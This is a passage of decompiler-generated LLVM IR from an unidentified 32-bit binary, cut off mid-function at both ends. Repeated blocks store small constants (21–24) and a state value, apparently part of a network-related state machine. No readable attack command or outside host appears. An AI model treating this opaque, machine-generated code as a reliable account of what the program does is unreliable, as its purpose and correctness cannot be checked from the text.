  %v2_80515e8 = add i32 %v0_80515d9, -16
  %v3_80515e8 = inttoptr i32 %v2_80515e8 to i32*
  store i32 %v3_80515e5, i32* %v3_80515e8, align 4
  %v0_80515e9 = call i32 @function_80532c4()
  store i32 %v0_80515e9, i32* %eax.global-to-local, align 4
  %v0_80515f1 = load i32, i32* @edi, align 4
  %v1_80515f1 = add i32 %v0_80515f1, 12
  %v2_80515f1 = inttoptr i32 %v1_80515f1 to i32*
  store i32 5, i32* %v2_80515f1, align 4
  br label %dec_label_pc_80512e1

dec_label_pc_80515fd:                             ; preds = %dec_label_pc_80511e9, %dec_label_pc_80511e0, %dec_label_pc_80511d7, %dec_label_pc_80511ce, %dec_label_pc_80511c1
  %v1_80515fd = add i32 %v0_80515fd, 1
  store i32 %v1_80515fd, i32* @ebp, align 4
  %v10_8051600 = icmp eq i32 %v0_80515fd, -2
  br i1 %v10_8051600, label %dec_label_pc_8050f72.loopexit12.loopexit, label %dec_label_pc_8051609

dec_label_pc_8051609:                             ; preds = %dec_label_pc_80515fd
  %tmp150 = icmp slt i32 %v1_80515fd, 1
  br i1 %tmp150, label %dec_label_pc_8051413, label %dec_label_pc_8051611

dec_label_pc_8051611:                             ; preds = %dec_label_pc_8051609
  %v0_8051611 = load i32, i32* @esp, align 4
  %v1_8051614 = add i32 %v0_8051611, -16
  %v2_8051614 = inttoptr i32 %v1_8051614 to i32*
  store i32 22, i32* %v2_8051614, align 4
  %v2_8051616 = call i32 @function_8051c90(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8051616, i32* %eax.global-to-local, align 4
  %v0_805161b = load i32, i32* @esp, align 4
  %v1_805161b = inttoptr i32 %v0_805161b to i32*
  %v2_805161b = load i32, i32* %v1_805161b, align 4
  store i32 %v2_805161b, i32* %eax.global-to-local, align 4
  %v3_805161b = add i32 %v0_805161b, 4
  %v1_805161c = inttoptr i32 %v3_805161b to i32*
  %v2_805161c = load i32, i32* %v1_805161c, align 4
  store i32 %v2_805161c, i32* %edx.global-to-local, align 4
  %v1_805161d = add i32 %v0_805161b, 1888
  store i32 %v1_805161d, i32* %eax.global-to-local, align 4
  store i32 %v1_805161d, i32* %v1_805161c, align 4
  store i32 22, i32* %v1_805161b, align 4
  %v3_8051627 = call i32 @function_8051be0(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_8051627, i32* %eax.global-to-local, align 4
  %v0_805162c = load i32, i32* @esp, align 4
  %v1_805162c = add i32 %v0_805162c, -4
  %v2_805162c = inttoptr i32 %v1_805162c to i32*
  store i32 16384, i32* %v2_805162c, align 4
  %v1_8051631 = add i32 %v0_805162c, 1888
  %v2_8051631 = inttoptr i32 %v1_8051631 to i32*
  %v3_8051631 = load i32, i32* %v2_8051631, align 4
  store i32 %v3_8051631, i32* @esi, align 4
  %v2_8051638 = add i32 %v0_805162c, -8
  %v3_8051638 = inttoptr i32 %v2_8051638 to i32*
  store i32 %v3_8051631, i32* %v3_8051638, align 4
  %v2_8051639 = add i32 %v0_805162c, -12
  %v3_8051639 = inttoptr i32 %v2_8051639 to i32*
  store i32 %v3_8051627, i32* %v3_8051639, align 4
  %v0_805163a = load i32, i32* @edi, align 4
  %v1_805163a = add i32 %v0_805163a, 4
  %v2_805163a = inttoptr i32 %v1_805163a to i32*
  %v3_805163a = load i32, i32* %v2_805163a, align 4
  store i32 %v3_805163a, i32* @ebx, align 4
  %v2_805163d = add i32 %v0_805162c, -16
  %v3_805163d = inttoptr i32 %v2_805163d to i32*
  store i32 %v3_805163a, i32* %v3_805163d, align 4
  %v0_805163e = call i32 @function_80532c4()
  store i32 %v0_805163e, i32* %eax.global-to-local, align 4
  %v0_8051643 = load i32, i32* @esp, align 4
  %v1_8051646 = add i32 %v0_8051643, 28
  %v2_8051646 = inttoptr i32 %v1_8051646 to i32*
  store i32 16384, i32* %v2_8051646, align 4
  %v1_805164b = add i32 %v0_8051643, 24
  %v2_805164b = inttoptr i32 %v1_805164b to i32*
  store i32 2, i32* %v2_805164b, align 4
  %v1_805164d = add i32 %v0_8051643, 20
  %v2_805164d = inttoptr i32 %v1_805164d to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80554a6.10 to i32), i32* %v2_805164d, align 4
  %v0_8051652 = load i32, i32* @edi, align 4
  %v1_8051652 = add i32 %v0_8051652, 4
  %v2_8051652 = inttoptr i32 %v1_8051652 to i32*
  %v3_8051652 = load i32, i32* %v2_8051652, align 4
  store i32 %v3_8051652, i32* %ecx.global-to-local, align 4
  %v2_8051655 = add i32 %v0_8051643, 16
  %v3_8051655 = inttoptr i32 %v2_8051655 to i32*
  store i32 %v3_8051652, i32* %v3_8051655, align 4
  %v0_8051656 = call i32 @function_80532c4()
  store i32 %v0_8051656, i32* %eax.global-to-local, align 4
  %v0_805165b = load i32, i32* @esp, align 4
  %v1_805165b = inttoptr i32 %v0_805165b to i32*
  store i32 22, i32* %v1_805165b, align 4
  %v2_8051662 = call i32 @function_8051c10(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8051662, i32* %eax.global-to-local, align 4
  %v0_805166a = load i32, i32* @edi, align 4
  %v1_805166a = add i32 %v0_805166a, 12
  %v2_805166a = inttoptr i32 %v1_805166a to i32*
  store i32 7, i32* %v2_805166a, align 4
  br label %dec_label_pc_80512e1

dec_label_pc_8051676:                             ; preds = %dec_label_pc_80513f7, %dec_label_pc_80513ee, %dec_label_pc_80513e5, %dec_label_pc_80513dc, %dec_label_pc_80513cf
  %v1_8051676 = add i32 %v0_8051676, 1
  store i32 %v1_8051676, i32* @ebp, align 4
  %v10_8051679 = icmp eq i32 %v0_8051676, -2
  br i1 %v10_8051679, label %dec_label_pc_8050f72.loopexit12.loopexit, label %dec_label_pc_8051682

dec_label_pc_8051682:                             ; preds = %dec_label_pc_8051676
  %tmp151 = icmp slt i32 %v1_8051676, 1
  br i1 %tmp151, label %dec_label_pc_8051413, label %dec_label_pc_805168a

dec_label_pc_805168a:                             ; preds = %dec_label_pc_8051682
  %v0_805168a = load i32, i32* @esp, align 4
  %v1_805168d = add i32 %v0_805168a, -16
  %v2_805168d = inttoptr i32 %v1_805168d to i32*
  store i32 24, i32* %v2_805168d, align 4
  %v2_805168f = call i32 @function_8051c90(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_805168f, i32* %eax.global-to-local, align 4
  %v0_8051694 = load i32, i32* @esp, align 4
  %v1_8051694 = inttoptr i32 %v0_8051694 to i32*
  %v2_8051694 = load i32, i32* %v1_8051694, align 4
  store i32 %v2_8051694, i32* %eax.global-to-local, align 4
  %v3_8051694 = add i32 %v0_8051694, 4
  %v1_8051695 = inttoptr i32 %v3_8051694 to i32*
  %v1_8051696 = add i32 %v0_8051694, 1880
  store i32 %v1_8051696, i32* %edx.global-to-local, align 4
  store i32 %v1_8051696, i32* %v1_8051695, align 4
  store i32 24, i32* %v1_8051694, align 4
  %v3_80516a0 = call i32 @function_8051be0(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_80516a0, i32* %eax.global-to-local, align 4
  %v0_80516a5 = load i32, i32* @esp, align 4
  %v1_80516a5 = add i32 %v0_80516a5, -4
  %v2_80516a5 = inttoptr i32 %v1_80516a5 to i32*
  store i32 16384, i32* %v2_80516a5, align 4
  %v1_80516aa = add i32 %v0_80516a5, 1880
  %v2_80516aa = inttoptr i32 %v1_80516aa to i32*
  %v3_80516aa = load i32, i32* %v2_80516aa, align 4
  store i32 %v3_80516aa, i32* @esi, align 4
  %v2_80516b1 = add i32 %v0_80516a5, -8
  %v3_80516b1 = inttoptr i32 %v2_80516b1 to i32*
  store i32 %v3_80516aa, i32* %v3_80516b1, align 4
  %v2_80516b2 = add i32 %v0_80516a5, -12
  %v3_80516b2 = inttoptr i32 %v2_80516b2 to i32*
  store i32 %v3_80516a0, i32* %v3_80516b2, align 4
  %v0_80516b3 = load i32, i32* @edi, align 4
  %v1_80516b3 = add i32 %v0_80516b3, 4
  %v2_80516b3 = inttoptr i32 %v1_80516b3 to i32*
  %v3_80516b3 = load i32, i32* %v2_80516b3, align 4
  store i32 %v3_80516b3, i32* @ebx, align 4
  %v2_80516b6 = add i32 %v0_80516a5, -16
  %v3_80516b6 = inttoptr i32 %v2_80516b6 to i32*
  store i32 %v3_80516b3, i32* %v3_80516b6, align 4
  %v0_80516b7 = call i32 @function_80532c4()
  store i32 %v0_80516b7, i32* %eax.global-to-local, align 4
  %v0_80516bc = load i32, i32* @esp, align 4
  %v1_80516bf = add i32 %v0_80516bc, 28
  %v2_80516bf = inttoptr i32 %v1_80516bf to i32*
  store i32 16384, i32* %v2_80516bf, align 4
  %v1_80516c4 = add i32 %v0_80516bc, 24
  %v2_80516c4 = inttoptr i32 %v1_80516c4 to i32*
  store i32 2, i32* %v2_80516c4, align 4
  %v1_80516c6 = add i32 %v0_80516bc, 20
  %v2_80516c6 = inttoptr i32 %v1_80516c6 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80554a6.10 to i32), i32* %v2_80516c6, align 4
  %v0_80516cb = load i32, i32* @edi, align 4
  %v1_80516cb = add i32 %v0_80516cb, 4
  %v2_80516cb = inttoptr i32 %v1_80516cb to i32*
  %v3_80516cb = load i32, i32* %v2_80516cb, align 4
  store i32 %v3_80516cb, i32* %ecx.global-to-local, align 4
  %v2_80516ce = add i32 %v0_80516bc, 16
  %v3_80516ce = inttoptr i32 %v2_80516ce to i32*
  store i32 %v3_80516cb, i32* %v3_80516ce, align 4
  %v0_80516cf = call i32 @function_80532c4()
  store i32 %v0_80516cf, i32* %eax.global-to-local, align 4
  %v0_80516d4 = load i32, i32* @esp, align 4
  %v1_80516d4 = inttoptr i32 %v0_80516d4 to i32*
  store i32 24, i32* %v1_80516d4, align 4
  %v2_80516db = call i32 @function_8051c10(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_80516db, i32* %eax.global-to-local, align 4
  %v0_80516e3 = load i32, i32* @edi, align 4
  %v1_80516e3 = add i32 %v0_80516e3, 12
  %v2_80516e3 = inttoptr i32 %v1_80516e3 to i32*
  store i32 10, i32* %v2_80516e3, align 4
  br label %dec_label_pc_80512e1

dec_label_pc_80516ef:                             ; preds = %dec_label_pc_80511a4, %dec_label_pc_805119b, %dec_label_pc_8051192, %dec_label_pc_8051189, %dec_label_pc_805117c
  %v1_80516ef = add i32 %v0_80516ef, 1
  store i32 %v1_80516ef, i32* @ebp, align 4
  %v10_80516f2 = icmp eq i32 %v0_80516ef, -2
  br i1 %v10_80516f2, label %dec_label_pc_8050f72.loopexit12.loopexit, label %dec_label_pc_80516fb

dec_label_pc_80516fb:                             ; preds = %dec_label_pc_80516ef
  %tmp152 = icmp slt i32 %v1_80516ef, 1
  br i1 %tmp152, label %dec_label_pc_8051413, label %dec_label_pc_8051703

dec_label_pc_8051703:                             ; preds = %dec_label_pc_80516fb
  %v0_8051703 = load i32, i32* @esp, align 4
  %v1_8051706 = add i32 %v0_8051703, -16
  %v2_8051706 = inttoptr i32 %v1_8051706 to i32*
  store i32 23, i32* %v2_8051706, align 4
  %v2_8051708 = call i32 @function_8051c90(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8051708, i32* %eax.global-to-local, align 4
  %v0_805170d = load i32, i32* @esp, align 4
  %v1_805170d = inttoptr i32 %v0_805170d to i32*
  %v2_805170d = load i32, i32* %v1_805170d, align 4
  store i32 %v2_805170d, i32* %eax.global-to-local, align 4
  %v3_805170d = add i32 %v0_805170d, 4
  %v1_805170e = inttoptr i32 %v3_805170d to i32*
  %v2_805170e = load i32, i32* %v1_805170e, align 4
  store i32 %v2_805170e, i32* %edx.global-to-local, align 4
  %v1_805170f = add i32 %v0_805170d, 1880
  store i32 %v1_805170f, i32* %eax.global-to-local, align 4
  store i32 %v1_805170f, i32* %v1_805170e, align 4
  store i32 23, i32* %v1_805170d, align 4
  %v3_8051719 = call i32 @function_8051be0(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_8051719, i32* %eax.global-to-local, align 4
  %v0_805171e = load i32, i32* @esp, align 4
  %v1_805171e = add i32 %v0_805171e, -4
  %v2_805171e = inttoptr i32 %v1_805171e to i32*
  store i32 16384, i32* %v2_805171e, align 4
  %v1_8051723 = add i32 %v0_805171e, 1880
  %v2_8051723 = inttoptr i32 %v1_8051723 to i32*
  %v3_8051723 = load i32, i32* %v2_8051723, align 4
  store i32 %v3_8051723, i32* @esi, align 4
  %v2_805172a = add i32 %v0_805171e, -8
  %v3_805172a = inttoptr i32 %v2_805172a to i32*
  store i32 %v3_8051723, i32* %v3_805172a, align 4
  %v2_805172b = add i32 %v0_805171e, -12
  %v3_805172b = inttoptr i32 %v2_805172b to i32*
  store i32 %v3_8051719, i32* %v3_805172b, align 4
  %v0_805172c = load i32, i32* @edi, align 4
  %v1_805172c = add i32 %v0_805172c, 4
  %v2_805172c = inttoptr i32 %v1_805172c to i32*
  %v3_805172c = load i32, i32* %v2_805172c, align 4
  store i32 %v3_805172c, i32* @ebx, align 4
  %v2_805172f = add i32 %v0_805171e, -16
  %v3_805172f = inttoptr i32 %v2_805172f to i32*
  store i32 %v3_805172c, i32* %v3_805172f, align 4
  %v0_8051730 = call i32 @function_80532c4()
  store i32 %v0_8051730, i32* %eax.global-to-local, align 4
  %v0_8051735 = load i32, i32* @esp, align 4
  %v1_8051738 = add i32 %v0_8051735, 28
  %v2_8051738 = inttoptr i32 %v1_8051738 to i32*
  store i32 16384, i32* %v2_8051738, align 4
  %v1_805173d = add i32 %v0_8051735, 24
  %v2_805173d = inttoptr i32 %v1_805173d to i32*
  store i32 2, i32* %v2_805173d, align 4
  %v1_805173f = add i32 %v0_8051735, 20
  %v2_805173f = inttoptr i32 %v1_805173f to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80554a6.10 to i32), i32* %v2_805173f, align 4
  %v0_8051744 = load i32, i32* @edi, align 4
  %v1_8051744 = add i32 %v0_8051744, 4
  %v2_8051744 = inttoptr i32 %v1_8051744 to i32*
  %v3_8051744 = load i32, i32* %v2_8051744, align 4
  store i32 %v3_8051744, i32* %ecx.global-to-local, align 4
  %v2_8051747 = add i32 %v0_8051735, 16
  %v3_8051747 = inttoptr i32 %v2_8051747 to i32*
  store i32 %v3_8051744, i32* %v3_8051747, align 4
  %v0_8051748 = call i32 @function_80532c4()
  store i32 %v0_8051748, i32* %eax.global-to-local, align 4
  %v0_805174d = load i32, i32* @esp, align 4
  %v1_805174d = inttoptr i32 %v0_805174d to i32*
  store i32 23, i32* %v1_805174d, align 4
  %v2_8051754 = call i32 @function_8051c10(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8051754, i32* %eax.global-to-local, align 4
  %v0_805175c = load i32, i32* @edi, align 4
  %v1_805175c = add i32 %v0_805175c, 12
  %v2_805175c = inttoptr i32 %v1_805175c to i32*
  store i32 9, i32* %v2_805175c, align 4
  br label %dec_label_pc_80512e1

dec_label_pc_8051768:                             ; preds = %dec_label_pc_8050f66, %dec_label_pc_8050f5d, %dec_label_pc_8050f54, %dec_label_pc_8050f4b, %dec_label_pc_8050f3e
  %v1_8051768 = add i32 %v0_8051768, 1
  store i32 %v1_8051768, i32* @ebp, align 4
  %v10_805176b = icmp eq i32 %v0_8051768, -2
  br i1 %v10_805176b, label %dec_label_pc_8050f72.loopexit12.loopexit, label %dec_label_pc_8051774

dec_label_pc_8051774:                             ; preds = %dec_label_pc_8051768
  %tmp153 = icmp slt i32 %v1_8051768, 1
  br i1 %tmp153, label %dec_label_pc_8051413, label %dec_label_pc_805177c

dec_label_pc_805177c:                             ; preds = %dec_label_pc_8051774
  %v0_805177c = load i32, i32* @esp, align 4
  %v1_805177f = add i32 %v0_805177c, -16
  %v2_805177f = inttoptr i32 %v1_805177f to i32*
  store i32 21, i32* %v2_805177f, align 4
  %v2_8051781 = call i32 @function_8051c90(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8051781, i32* %eax.global-to-local, align 4
  %v0_8051786 = load i32, i32* @esp, align 4
  %v1_8051786 = inttoptr i32 %v0_8051786 to i32*
  %v2_8051786 = load i32, i32* %v1_8051786, align 4
  store i32 %v2_8051786, i32* %eax.global-to-local, align 4
  %v3_8051786 = add i32 %v0_8051786, 4
  %v1_8051787 = inttoptr i32 %v3_8051786 to i32*
  %v2_8051787 = load i32, i32* %v1_8051787, align 4
  store i32 %v2_8051787, i32* %edx.global-to-local, align 4
  %v1_8051788 = add i32 %v0_8051786, 1880
  store i32 %v1_8051788, i32* %ecx.global-to-local, align 4
  store i32 %v1_8051788, i32* %v1_8051787, align 4
  store i32 21, i32* %v1_8051786, align 4
  %v3_8051792 = call i32 @function_8051be0(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_8051792, i32* %eax.global-to-local, align 4
  %v0_8051797 = load i32, i32* @esp, align 4
  %v1_8051797 = add i32 %v0_8051797, -4
  %v2_8051797 = inttoptr i32 %v1_8051797 to i32*
  store i32 16384, i32* %v2_8051797, align 4
  %v1_805179c = add i32 %v0_8051797, 1880
  %v2_805179c = inttoptr i32 %v1_805179c to i32*
  %v3_805179c = load i32, i32* %v2_805179c, align 4
  store i32 %v3_805179c, i32* @esi, align 4
  %v2_80517a3 = add i32 %v0_8051797, -8
  %v3_80517a3 = inttoptr i32 %v2_80517a3 to i32*
  store i32 %v3_805179c, i32* %v3_80517a3, align 4
  %v2_80517a4 = add i32 %v0_8051797, -12
  %v3_80517a4 = inttoptr i32 %v2_80517a4 to i32*
  store i32 %v3_8051792, i32* %v3_80517a4, align 4
  %v0_80517a5 = load i32, i32* @edi, align 4
  %v1_80517a5 = add i32 %v0_80517a5, 4
  %v2_80517a5 = inttoptr i32 %v1_80517a5 to i32*
  %v3_80517a5 = load i32, i32* %v2_80517a5, align 4
  store i32 %v3_80517a5, i32* @ebx, align 4
  %v2_80517a8 = add i32 %v0_8051797, -16
  %v3_80517a8 = inttoptr i32 %v2_80517a8 to i32*
  store i32 %v3_80517a5, i32* %v3_80517a8, align 4
  %v0_80517a9 = call i32 @function_80532c4()
  store i32 %v0_80517a9, i32* %eax.global-to-local, align 4
  %v0_80517ae = load i32, i32* @esp, align 4
  %v1_80517b1 = add i32 %v0_80517ae, 28
  %v2_80517b1 = inttoptr i32 %v1_80517b1 to i32*
  store i32 16384, i32* %v2_80517b1, align 4
  %v1_80517b6 = add i32 %v0_80517ae, 24
  %v2_80517b6 = inttoptr i32 %v1_80517b6 to i32*
  store i32 2, i32* %v2_80517b6, align 4
  %v1_80517b8 = add i32 %v0_80517ae, 20
  %v2_80517b8 = inttoptr i32 %v1_80517b8 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80554a6.10 to i32), i32* %v2_80517b8, align 4
  %v0_80517bd = load i32, i32* @edi, align 4
  %v1_80517bd = add i32 %v0_80517bd, 4
  %v2_80517bd = inttoptr i32 %v1_80517bd to i32*
  %v3_80517bd = load i32, i32* %v2_80517bd, align 4
  store i32 %v3_80517bd, i32* %ecx.global-to-local, align 4
  %v2_80517c0 = add i32 %v0_80517ae, 16
  %v3_80517c0 = inttoptr i32 %v2_80517c0 to i32*
  store i32 %v3_80517bd, i32* %v3_80517c0, align 4
  %v0_80517c1 = call i32 @function_80532c4()
  store i32 %v0_80517c1, i32* %eax.global-to-local, align 4
  %v0_80517c6 = load i32, i32* @esp, align 4
  %v1_80517c6 = inttoptr i32 %v0_80517c6 to i32*
  store i32 21, i32* %v1_80517c6, align 4
  %v2_80517cd = call i32 @function_8051c10(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_80517cd, i32* %eax.global-to-local, align 4
  %v0_80517d5 = load i32, i32* @edi, align 4
  %v1_80517d5 = add i32 %v0_80517d5, 12
  %v2_80517d5 = inttoptr i32 %v1_80517d5 to i32*
  store i32 6, i32* %v2_80517d5, align 4
  br label %dec_label_pc_80512e1

dec_label_pc_80517e1:                             ; preds = %dec_label_pc_8051200
  %v2_80517eb = load i32, i32* %v1_80517eb, align 4
  store i32 %v2_80517eb, i32* %eax.global-to-local, align 4
  %v0_80517ec = load i32, i32* @edi, align 4
  %v1_80517ec = add i32 %v0_80517ec, 4
  %v2_80517ec = inttoptr i32 %v1_80517ec to i32*
  %v3_80517ec = load i32, i32* %v2_80517ec, align 4
  store i32 %v3_80517ec, i32* %eax.global-to-local, align 4
  store i32 %v3_80517ec, i32* %v1_80517eb, align 4
  %v1_80517f0 = call i32 @function_8052b81(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_80517f0, i32* %eax.global-to-local, align 4
  %v0_80517f5 = load i32, i32* @edi, align 4
  %v1_80517f5 = add i32 %v0_80517f5, 284
  %v2_80517f5 = inttoptr i32 %v1_80517f5 to i8*
  %v3_80517f5 = load i8, i8* %v2_80517f5, align 1
  %v4_80517f5 = zext i8 %v3_80517f5 to i32
  %v6_80517f5 = and i32 %v1_80517f0, -256
  %v7_80517f5 = or i32 %v4_80517f5, %v6_80517f5
  %v1_80517fe = add i32 %v7_80517f5, 1
  store i32 %v1_80517fe, i32* %eax.global-to-local, align 4
  %v1_80517ff = add i32 %v0_80517f5, 4
  %v2_80517ff = inttoptr i32 %v1_80517ff to i32*
  store i32 -1, i32* %v2_80517ff, align 4
  %v0_8051806 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051806 = trunc i32 %v0_8051806 to i8
  %v2_8051806 = load i32, i32* @edi, align 4
  %v3_8051806 = add i32 %v2_8051806, 284
  %v4_8051806 = inttoptr i32 %v3_8051806 to i8*
  store i8 %v1_8051806, i8* %v4_8051806, align 1
  %v0_805180c = load i32, i32* %eax.global-to-local, align 4
  %v1_805180c = trunc i32 %v0_805180c to i8
  %v10_805180c = icmp eq i8 %v1_805180c, 10
  %v1_805180e = icmp eq i1 %v10_805180c, false
  br i1 %v1_805180e, label %dec_label_pc_80519a0, label %dec_label_pc_8051814

dec_label_pc_8051814:                             ; preds = %dec_label_pc_80517e1
  store i32 -1, i32* @ebp, align 4
  %v0_8051817 = load i32, i32* @edi, align 4
  %v1_8051817 = add i32 %v0_8051817, 284
  %v2_8051817 = inttoptr i32 %v1_8051817 to i8*
  store i8 0, i8* %v2_8051817, align 1
  %v0_805181e = load i32, i32* @edi, align 4
  %v1_805181e = add i32 %v0_805181e, 12
  %v2_805181e = inttoptr i32 %v1_805181e to i32*
  store i32 0, i32* %v2_805181e, align 4
  br label %dec_label_pc_80512e1

dec_label_pc_805182a:                             ; preds = %dec_label_pc_8051494
  %v1_805182a = add i32 %v0_8051480, -4
  %v2_805182a = inttoptr i32 %v1_805182a to i32*
  store i32 16384, i32* %v2_805182a, align 4
  %v1_805182f = add i32 %v0_8051480, -8
  %v2_805182f = inttoptr i32 %v1_805182f to i32*
  store i32 3, i32* %v2_805182f, align 4
  %v1_8051831 = add i32 %v0_8051480, 1879
  store i32 %v1_8051831, i32* %eax.global-to-local, align 4
  %v0_8051838 = load i32, i32* @ebx, align 4
  %v1_8051838 = add i32 %v0_8051838, 3
  store i32 %v1_8051838, i32* @ebx, align 4
  %v2_805183b = add i32 %v0_8051480, -12
  %v3_805183b = inttoptr i32 %v2_805183b to i32*
  store i32 %v1_8051831, i32* %v3_805183b, align 4
  %v0_805183c = load i32, i32* @ebp, align 4
  %v1_805183c = add i32 %v0_805183c, 3
  store i32 %v1_805183c, i32* @ebp, align 4
  %v0_805183f = load i32, i32* @edi, align 4
  %v1_805183f = add i32 %v0_805183f, 4
  %v2_805183f = inttoptr i32 %v1_805183f to i32*
  %v3_805183f = load i32, i32* %v2_805183f, align 4
  store i32 %v3_805183f, i32* @esi, align 4
  %v2_8051842 = add i32 %v0_8051480, -16
  %v3_8051842 = inttoptr i32 %v2_8051842 to i32*
  store i32 %v3_805183f, i32* %v3_8051842, align 4
  %v0_8051843 = call i32 @function_80532c4()
  %v0_8051848 = load i32, i32* @esp, align 4
  %v1_8051848 = add i32 %v0_8051848, -4
  %v2_8051848 = inttoptr i32 %v1_8051848 to i32*
  store i32 16384, i32* %v2_8051848, align 4
  %v1_805184d = add i32 %v0_8051848, -8
  %v2_805184d = inttoptr i32 %v1_805184d to i32*
  store i32 9, i32* %v2_805184d, align 4
  %v1_805184f = add i32 %v0_8051848, 1863
  store i32 %v1_805184f, i32* %eax.global-to-local, align 4
  %v2_8051856 = add i32 %v0_8051848, -12
  %v3_8051856 = inttoptr i32 %v2_8051856 to i32*
  store i32 %v1_805184f, i32* %v3_8051856, align 4
  %v0_8051857 = load i32, i32* @edi, align 4
  %v1_8051857 = add i32 %v0_8051857, 4
  %v2_8051857 = inttoptr i32 %v1_8051857 to i32*
  %v3_8051857 = load i32, i32* %v2_8051857, align 4
  store i32 %v3_8051857, i32* %ecx.global-to-local, align 4
  %v2_805185a = add i32 %v0_8051848, -16
  %v3_805185a = inttoptr i32 %v2_805185a to i32*
  store i32 %v3_8051857, i32* %v3_805185a, align 4
  %v0_805185b = call i32 @function_80532c4()
  store i32 %v0_805185b, i32* %eax.global-to-local, align 4
  %v0_8051860 = load i32, i32* @esp, align 4
  %v1_8051860 = add i32 %v0_8051860, 32
  %v0_8051863 = load i32, i32* @edi, align 4
  %v1_8051863 = add i32 %v0_8051863, 24
  %v2_8051863 = inttoptr i32 %v1_8051863 to i32*
  %v3_8051863 = load i32, i32* %v2_8051863, align 4
  store i32 %v3_8051863, i32* %edx.global-to-local, align 4
  %v0_8050ffd.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8050ffd.backedge

dec_label_pc_805186b:                             ; preds = %dec_label_pc_8050ee7
  %v1_805186b = add i32 %v0_8050ef1, 1872
  %v2_805186b = inttoptr i32 %v1_805186b to i32*
  store i32 0, i32* %v2_805186b, align 4
  %v0_8051876 = load i32, i32* @esp, align 4
  %v1_8051876 = add i32 %v0_8051876, 1864
  %v2_8051876 = inttoptr i32 %v1_8051876 to i32*
  store i32 4, i32* %v2_8051876, align 4
  %v0_8051881 = load i32, i32* @esp, align 4
  %v1_8051884 = add i32 %v0_8051881, 1864
  %v2_805188b = add i32 %v0_8051881, -16
  %v3_805188b = inttoptr i32 %v2_805188b to i32*
  store i32 %v1_8051884, i32* %v3_805188b, align 4
  %v1_805188c = add i32 %v0_8051881, 1872
  store i32 %v1_805188c, i32* %eax.global-to-local, align 4
  %v2_8051893 = add i32 %v0_8051881, -20
  %v3_8051893 = inttoptr i32 %v2_8051893 to i32*
  store i32 %v1_805188c, i32* %v3_8051893, align 4
  %v1_8051894 = add i32 %v0_8051881, -24
  %v2_8051894 = inttoptr i32 %v1_8051894 to i32*
  store i32 4, i32* %v2_8051894, align 4
  %v1_8051896 = add i32 %v0_8051881, -28
  %v2_8051896 = inttoptr i32 %v1_8051896 to i32*
  store i32 1, i32* %v2_8051896, align 4
  %v0_8051898 = load i32, i32* @edi, align 4
  %v1_8051898 = add i32 %v0_8051898, 4
  %v2_8051898 = inttoptr i32 %v1_8051898 to i32*
  %v3_8051898 = load i32, i32* %v2_8051898, align 4
  store i32 %v3_8051898, i32* %eax.global-to-local, align 4
  %v2_805189b = add i32 %v0_8051881, -32
  %v3_805189b = inttoptr i32 %v2_805189b to i32*
  store i32 %v3_8051898, i32* %v3_805189b, align 4
  %v0_805189c = call i32 @function_80531f0()
  store i32 %v0_805189c, i32* %eax.global-to-local, align 4
  %v0_80518a1 = load i32, i32* @esp, align 4
  %v2_80518a4 = add i32 %v0_80518a1, 1904
  %v3_80518a4 = inttoptr i32 %v2_80518a4 to i32*
  %v4_80518a4 = load i32, i32* %v3_80518a4, align 4
  %v5_80518a4 = or i32 %v4_80518a4, %v0_805189c
  %v6_80518a4 = icmp eq i32 %v5_80518a4, 0
  store i32 %v5_80518a4, i32* %eax.global-to-local, align 4
  %v1_80518ab = icmp eq i1 %v6_80518a4, false
  br i1 %v1_80518ab, label %dec_label_pc_805190c, label %dec_label_pc_80518ad

dec_label_pc_80518ad:                             ; preds = %dec_label_pc_805186b
  %v0_80518ad = load i32, i32* @edi, align 4
  %v1_80518ad = add i32 %v0_80518ad, 12
  %v2_80518ad = inttoptr i32 %v1_80518ad to i32*
  store i32 2, i32* %v2_80518ad, align 4
  %v1_80518b4 = call i32 @function_804fa00(i32 ptrtoint (i32* @0 to i32))
  %v2_80518b4 = sext i32 %v1_80518b4 to i64
  %v0_80518b9 = load i16, i16* @global_var_80572ac.49, align 4
  %v1_80518b9 = zext i16 %v0_80518b9 to i32
  %v0_80518c6 = load i32, i32* @global_var_8057278.50, align 8
  store i32 %v0_80518c6, i32* @ebx, align 4
  store i32 %v1_80518b9, i32* %ecx.global-to-local, align 4
  %v8_80518d0 = zext i16 %v0_80518b9 to i64
  %v9_80518d0 = udiv i64 %v2_80518b4, %v8_80518d0
  %v10_80518d0 = trunc i64 %v9_80518d0 to i32
  store i32 %v10_80518d0, i32* %eax.global-to-local, align 4
  %v11_80518d0 = urem i64 %v2_80518b4, %v8_80518d0
  %v12_80518d0 = trunc i64 %v11_80518d0 to i32
  store i32 %v12_80518d0, i32* %edx.global-to-local, align 4
  %tmp154 = icmp slt i32 %v0_80518c6, 1
  br i1 %tmp154, label %dec_label_pc_80519d1, label %dec_label_pc_80518da

dec_label_pc_80518da:                             ; preds = %dec_label_pc_80518ad
  %v0_80518da = load i32, i32* @global_var_80572a8.51, align 8
  store i32 %v0_80518da, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_80518ef = trunc i64 %v11_80518d0 to i16
  br label %dec_label_pc_80518ef

dec_label_pc_80518e3:                             ; preds = %dec_label_pc_80518f5, %dec_label_pc_80518ef
  %v1_80518e3 = add i32 %v0_80518e3, 1
  store i32 %v1_80518e3, i32* %ecx.global-to-local, align 4
  %v1_80518e4 = add i32 %v0_80518e4, 16
